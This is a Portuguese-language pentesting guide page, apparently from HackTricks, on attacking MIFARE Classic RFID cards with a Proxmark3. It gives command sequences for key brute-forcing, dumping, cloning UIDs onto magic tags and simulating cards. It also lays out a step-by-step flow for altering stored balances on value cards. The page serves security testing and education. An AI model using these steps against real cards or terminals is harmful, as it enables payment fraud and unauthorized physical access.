# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Atacando Sistemas RFID com Proxmark3

A primeira coisa que você precisa fazer é ter um [**Proxmark3**](https://proxmark.com) e [**instalar o software e suas dependênci**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**as**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Atacando MIFARE Classic 1KB

Ele possui **16 setores**, cada um com **4 blocos**, e cada bloco contém **16B**. O UID está no setor 0, bloco 0 (e não pode ser alterado).\
Para acessar cada setor, você precisa de **2 chaves** (**A** e **B**), armazenadas no **bloco 3 de cada setor** (sector trailer). O sector trailer também armazena os **access bits**, que concedem permissões de **leitura e escrita** em **cada bloco** usando as 2 chaves.\
2 chaves são úteis para conceder permissões de leitura se você souber a primeira e de escrita se souber a segunda (por exemplo).

Vários ataques podem ser realizados<sup>[[1]](#references)</sup>.
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
O Proxmark3 permite realizar outras ações, como **interceptar** uma **comunicação Tag para Reader**, para tentar encontrar dados sensíveis. Neste cartão, você pode simplesmente sniffar a comunicação e calcular a chave usada, pois as **operações criptográficas utilizadas são fracas** e, conhecendo o texto simples e o texto cifrado, você pode calculá-la (ferramenta `mfkey64`).<sup>[[3]](#references)</sup>

#### Fluxo rápido do MiFare Classic para abuso de valores armazenados

Quando os terminais armazenam saldos em cartões Classic, um fluxo típico de ponta a ponta é:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Notas

- `hf mf autopwn` orquestra ataques no estilo nested/darkside/HardNested, recupera chaves e cria dumps na pasta de dumps do cliente.
- A gravação do bloco 0/UID só funciona em magic gen1a/gen2 cards. Os cards Classic normais têm UID read-only.<sup>[[2]](#references)</sup>
- Muitas implementações usam **value blocks** do Classic ou checksums simples. Garanta que todos os campos duplicados/complementados e os checksums estejam consistentes após a edição.

Consulte uma metodologia de nível superior e as medidas de mitigação em:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

Sistemas IoT às vezes usam **tags sem marca ou não comerciais**. Nesse caso, você pode usar o Proxmark3 para enviar **comandos raw personalizados às tags**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Com essas informações, você pode tentar pesquisar informações sobre o card e sobre a maneira de se comunicar com ele. O Proxmark3 permite enviar comandos brutos, como: `hf 14a raw -p -b 7 26`

### Scripts

O software Proxmark3 vem com uma lista pré-carregada de **scripts de automação** que você pode usar para executar tarefas simples. Para obter a lista completa, use o comando `script list`. Em seguida, use o comando `script run`, seguido pelo nome do script:
```
proxmark3> script run mfkeys
```
Você pode criar um script para fazer **fuzzing em leitores de tags**. Depois de copiar os dados de um **cartão válido**, basta escrever um **script Lua** que **randomize** um ou mais **bytes** aleatórios e verificar se o **reader trava** em alguma iteração.

## Referências

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [Declaração da NXP sobre o MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Exploração de vulnerabilidade em cartões NFC no KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
